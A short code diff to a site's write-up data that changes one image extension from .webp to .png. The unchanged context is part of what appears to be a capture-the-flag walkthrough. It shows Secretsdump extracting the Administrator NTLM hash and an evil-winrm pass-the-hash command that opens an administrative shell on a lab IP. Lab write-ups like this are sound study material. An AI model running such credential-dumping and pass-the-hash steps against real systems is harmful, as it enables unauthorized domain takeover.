@@ -120,7 +120,7 @@ smb: \\> mget *</code></pre>
 
       <p>Secretsdump dumps the NTDS database, exposing the built-in Administrator NTLM hash. We gain an interactive administrative shell using <strong>Evil-WinRM</strong>:</p>
       <pre><code>evil-winrm -u Administrator -H &lt;ADMIN_NTLM_HASH&gt; -i 10.114.168.198</code></pre>
-      <img src="/images/writeups/Proxy/evil-winrm.webp" alt="Administrator Shell with Evil-WinRM" class="rounded border border-border my-4 w-full" />
+      <img src="/images/writeups/Proxy/evil-winrm.png" alt="Administrator Shell with Evil-WinRM" class="rounded border border-border my-4 w-full" />
     `,
   },
 ];
